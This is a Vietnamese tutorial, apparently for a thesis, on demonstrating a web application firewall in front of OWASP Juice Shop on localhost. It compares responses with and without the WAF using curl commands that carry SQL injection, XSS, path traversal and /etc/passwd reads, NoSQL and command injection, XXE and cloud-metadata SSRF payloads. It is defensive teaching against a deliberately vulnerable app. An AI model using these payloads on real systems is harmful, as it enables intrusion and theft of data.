# Kịch bản DEMO WAF với OWASP Juice Shop

Tài liệu này hướng dẫn **demo trực quan cho người khác xem**: cùng một payload tấn
công, bắn vào **site CÓ WAF** và **site KHÔNG WAF** để thấy rõ WAF chặn (403) trong
khi backend trần xử lý request bình thường.

> Bản chất WAF ở đây là **reverse proxy**: nó đứng *trước* Juice Shop. "Site có WAF"
> và "site không WAF" thực ra là **cùng một Juice Shop**, chỉ khác đường vào:
>
> | | URL | Mô tả |
> |---|---|---|
> | **CÓ WAF** | `http://localhost:8080` | đi qua WAF → bị lọc |
> | **KHÔNG WAF** | `http://localhost:3000` | vào thẳng Juice Shop trần |

---

## 1. Chuẩn bị

```bash
# (1) Backend Juice Shop chạy ở :3000 (đường "không WAF")
docker run -d --name juiceshop -p 127.0.0.1:3000:3000 bkimminich/juice-shop
# Hoặc mở ra mọi interface nếu muốn demo từ máy khác:  -p 3000:3000

# (2) config.yaml: upstream.url = http://127.0.0.1:3000  (đã là mặc định)

# (3) Chạy WAF ở :8080 (đường "có WAF")
make run-waf        # hoặc: ./bin/waf -config configs/config.yaml
```

Kiểm tra nhanh cả hai cùng sống:
```bash
curl -sI http://localhost:8080/ | head -1     # WAF → 200, trang Juice Shop
curl -sI http://localhost:3000/ | head -1     # backend trần → 200
```

---

## 2. Demo tự động (khuyến nghị khi trình bày)

Script bắn 9 lớp tấn công + 2 request hợp lệ vào **cả hai** đường, in kết quả cạnh nhau:

```bash
./scripts/demo_attacks.sh
# hoặc chỉ định URL (vd demo qua Cloudflare Tunnel):
./scripts/demo_attacks.sh https://xxxx.trycloudflare.com http://localhost:3000
```

Kết quả mong đợi:

```
### A. TRAFFIC HỢP LỆ — phải đi qua WAF bình thường
▸ Mở trang chủ (GET /)            CÓ WAF: cho qua (200)   KHÔNG WAF: cho qua (200)
▸ Tìm kiếm hợp lệ (q=apple)       CÓ WAF: cho qua (200)   KHÔNG WAF: cho qua (200)

### B. TẤN CÔNG — WAF chặn (403), backend trần xử lý request
▸ [1] SQLi — bypass đăng nhập     CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (200)
▸ [2] SQLi — UNION SELECT search  CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (200)
▸ [3] XSS — iframe/onload         CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (200)
▸ [4] Path Traversal — /ftp       CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (...)
▸ [5] LFI — /etc/passwd           CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (200)
▸ [6] NoSQL Injection — $ne       CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (500)
▸ [7] Command Injection           CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (200)
▸ [8] XXE — external entity       CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (400)
▸ [9] SSRF — cloud metadata       CÓ WAF: 🛡 BLOCKED (403)  KHÔNG WAF: xử lý (200)
```

> Script tự **gỡ auto-ban loopback** ở đầu mỗi lần chạy (mục 5) nên lặp lại được nhiều lần.

---

## 3. Demo thủ công từng lỗ hổng (browser + curl)

Mỗi mục dưới đây gắn với một **challenge có thật trong Juice Shop**, kèm: cách khai
thác, kết quả **khi KHÔNG có WAF** (thành công), và **khi CÓ WAF** (bị chặn 403).

Đặt biến cho gọn:
```bash
WAF=http://localhost:8080
BACK=http://localhost:3000
```

### [1] SQL Injection — bypass đăng nhập admin
**Challenge Juice Shop:** *"Login Admin"*. Ô email ghép thẳng vào câu SQL.
**Khai thác (browser):** trang Login → Email = `' OR 1=1--` , Password = bất kỳ.

```bash
# KHÔNG WAF → đăng nhập lọt, trả token (200)
curl -s -o /dev/null -w "no-waf : %{http_code}\n" -X POST "$BACK/rest/user/login" \
  -H 'Content-Type: application/json' --data '{"email":"'"'"' OR 1=1--","password":"x"}'
# CÓ WAF → 403, không chạm DB
curl -s -o /dev/null -w "waf    : %{http_code}\n" -X POST "$WAF/rest/user/login" \
  -H 'Content-Type: application/json' --data '{"email":"'"'"' OR 1=1--","password":"x"}'
```
WAF khớp `WAF-002-SQLI-BOOLEAN-OR`.

### [2] SQL Injection — UNION rút dữ liệu qua ô search
**Challenge:** *"Database Schema"* / *"Christmas Special"*. Tham số `q` của
`/rest/products/search` nối vào câu SQL → UNION rút bảng khác.
**Khai thác (browser):** gõ vào ô search: `')) UNION SELECT 1,2,...--`

```bash
curl -s -o /dev/null -w "no-waf : %{http_code}\n" -G "$BACK/rest/products/search" \
  --data-urlencode "q=')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--"
curl -s -o /dev/null -w "waf    : %{http_code}\n" -G "$WAF/rest/products/search" \
  --data-urlencode "q=')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--"
```
WAF khớp `WAF-001-SQLI-UNION`.

### [3] XSS — payload script/iframe trong search
**Challenge:** *"API-only XSS"* / *"Reflected XSS"*.
**Khai thác:** ô search nhập `<iframe src="javascript:alert(\`xss\`)">`.

```bash
curl -s -o /dev/null -w "no-waf : %{http_code}\n" -G "$BACK/rest/products/search" \
  --data-urlencode 'q=<iframe src="javascript:alert(`xss`)">'
curl -s -o /dev/null -w "waf    : %{http_code}\n" -G "$WAF/rest/products/search" \
  --data-urlencode 'q=<iframe src="javascript:alert(`xss`)">'
```
WAF khớp `WAF-011-XSS-EVENT-HANDLER`, `WAF-013-XSS-IFRAME-SVG` → **chặn request (403)**.

> ⚠️ **Phân biệt "chặn request" vs "ngăn thực thi" -**
>
> Tiêu chí WAF chặn được XSS **không phải** "script chạy ở đâu" (mọi XSS đều chạy ở
> client — đó là định nghĩa của nó), mà là **payload có đi xuyên qua server trong một
> HTTP request mà WAF đọc được không**:
>
> | Loại XSS | Payload qua server? | WAF chặn? |
> |---|---|---|
> | **Reflected** (server phản chiếu `?q=` vào HTML trả về) | ✅ | ✅ chặn request = **ngăn được hẳn** |
> | **Stored** (POST comment/review lưu DB) | ✅ | ✅ chặn lúc lưu |
> | **DOM-based** (đọc từ `location.hash`/fragment) | ❌ | ❌ không thấy → không chặn |
>
> **Riêng ô search Juice Shop là DOM-based:** sink render đọc giá trị từ **URL fragment**
> `/#/search?q=...` (phần sau `#` không bao giờ gửi lên server). Vì vậy WAF chặn được
> *API request* `/rest/products/search?q=` như lệnh trên (403, hữu ích để chứng minh
> rule hoạt động), **nhưng `alert` vẫn nổ** từ fragment — WAF không ngăn được lần thực
> thi đó. Nếu đây là một **reflected XSS thật** (server nhét payload vào response) thì
> chặn request = chặn hẳn script.

### [4] Path Traversal / truy cập file
**Challenge:** *"Access a Confidential Document"*, *"Poison Null Byte"*.
**Khai thác:** `GET /ftp/acquisitions.md` (file mật), hay leo thư mục ra ngoài /ftp.

```bash
curl -s -o /dev/null -w "no-waf : %{http_code}\n" "$BACK/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd"
curl -s -o /dev/null -w "waf    : %{http_code}\n" "$WAF/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd"
```
WAF khớp `WAF-021-LFI-SENSITIVE-FILES`, `IND-LFI-003-SENSITIVE-PATH`.

### [5] Local File Inclusion — đọc /etc/passwd qua tham số
```bash
curl -s -o /dev/null -w "no-waf : %{http_code}\n" -G "$BACK/" --data-urlencode "file=../../../../etc/passwd"
curl -s -o /dev/null -w "waf    : %{http_code}\n" -G "$WAF/"  --data-urlencode "file=../../../../etc/passwd"
```
WAF khớp `WAF-020-LFI-DOTDOT`, `WAF-021-LFI-SENSITIVE-FILES`.

### [6] NoSQL Injection
**Challenge:** *"NoSQL Manipulation"*. Juice Shop dùng MongoDB cho review/order.
**Khai thác:** chèn toán tử Mongo (`$ne`, `$gt`, `$where`).
```bash
curl -s -o /dev/null -w "no-waf : %{http_code}\n" -G "$BACK/rest/products/search" --data-urlencode 'q[$ne]=1'
curl -s -o /dev/null -w "waf    : %{http_code}\n" -G "$WAF/rest/products/search"  --data-urlencode 'q[$ne]=1'
```
WAF khớp `WAF-060-NOSQLI-MONGO-OPERATORS`.

### [7] OS Command Injection
```bash
curl -s -o /dev/null -w "no-waf : %{http_code}\n" -G "$BACK/" --data-urlencode "x=; cat /etc/passwd"
curl -s -o /dev/null -w "waf    : %{http_code}\n" -G "$WAF/"  --data-urlencode "x=; cat /etc/passwd"
```
WAF khớp `WAF-030-RCE-SHELL-CMDS`, `WAF-034-RCE-CHAR-SEPARATORS`.

### [8] XXE — XML External Entity
**Challenge:** *"XXE Data Access"*. Juice Shop nhận đơn B2B dạng XML.
**Khai thác:** upload XML có external entity trỏ `file:///etc/passwd`.
```bash
XML='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
curl -s -o /dev/null -w "no-waf : %{http_code}\n" -X POST "$BACK/file-upload" -H 'Content-Type: application/xml' --data "$XML"
curl -s -o /dev/null -w "waf    : %{http_code}\n" -X POST "$WAF/file-upload"  -H 'Content-Type: application/xml' --data "$XML"
```
WAF khớp `WAF-050-XXE-DOCTYPE-EXTERNAL`.

### [9] SSRF — Server-Side Request Forgery
**Challenge:** *"SSRF"*. Juice Shop tải ảnh đại diện từ URL người dùng cung cấp →
ép server gọi vào địa chỉ nội bộ (vd metadata cloud `169.254.169.254`).
```bash
curl -s -o /dev/null -w "no-waf : %{http_code}\n" -G "$BACK/profile/image/url" --data-urlencode "imageUrl=http://169.254.169.254/latest/meta-data/"
curl -s -o /dev/null -w "waf    : %{http_code}\n" -G "$WAF/profile/image/url"  --data-urlencode "imageUrl=http://169.254.169.254/latest/meta-data/"
```
WAF khớp `WAF-041-SSRF-CLOUD-METADATA`.

---

## 4. WAF KHÔNG chặn được gì (nói rõ trong thesis để trung thực)

WAF tầng mạng chỉ thấy được nội dung **gửi lên server qua HTTP**. Các lỗ hổng sau
nằm ngoài tầm và **không nên hứa là chặn được**:

| Lỗ hổng Juice Shop | Vì sao WAF không chặn |
|---|---|
| **DOM XSS** (`/#/search?q=`) | payload nằm trong URL fragment, không gửi lên server |
| **Broken Access Control / IDOR** (xem giỏ hàng người khác `/rest/basket/{id}`) | request hợp lệ về cú pháp; chỉ sai logic phân quyền — WAF không biết "ai được xem cái gì" |
| **JWT forgery / `alg:none`** | thao tác ở tầng ứng dụng, token vẫn là chuỗi hợp lệ |
| **Business logic** (số lượng âm, coupon, giá) | giá trị hợp lệ về kiểu dữ liệu, sai về nghiệp vụ |
| **Vulnerable components / lộ version** | không phải mẫu tấn công trong request |

→ Thông điệp đúng: *WAF là một lớp phòng thủ (defense-in-depth) chặn **injection theo
mẫu**, không thay thế việc vá lỗi ở ứng dụng.*

---

## 5. Reset giữa các lần demo

Sau khi bắn nhiều payload, WAF **tự động blacklist IP tấn công** (tính năng repeat
offender) → traffic sạch từ IP đó cũng bị 403. Đây là **điểm hay để demo thêm**
("tấn công liên tục bị cấm IP"), nhưng cần gỡ trước khi demo lại từ đầu:

```bash
# Gỡ ban loopback (script demo đã tự làm bước này)
for ip in "::1" "127.0.0.1"; do
  curl -s -X POST "$WAF/waf-api/ips/unblock" -H 'Content-Type: application/json' --data "{\"ip\":\"$ip\"}"; echo
done
```
Hoặc vào **Dashboard → IP Management** gỡ thủ công.

---

## 6. Quan sát trên Dashboard khi demo

Mở `http://localhost:8080/dashboard` (đăng nhập admin) song song khi chạy tấn công:
- **Access Log**: thấy từng request `BLOCK` realtime, kèm rule khớp + điểm anomaly.
- **IP Management**: thấy IP tấn công chuyển sang *suspicious* → *blocked*.
- **Metrics**: biểu đồ số request bị chặn theo loại tấn công.

Đây là phần "đắt" nhất khi trình bày: vừa bắn `./scripts/demo_attacks.sh`, vừa cho
khán giả nhìn log đỏ nhảy lên dashboard.
```
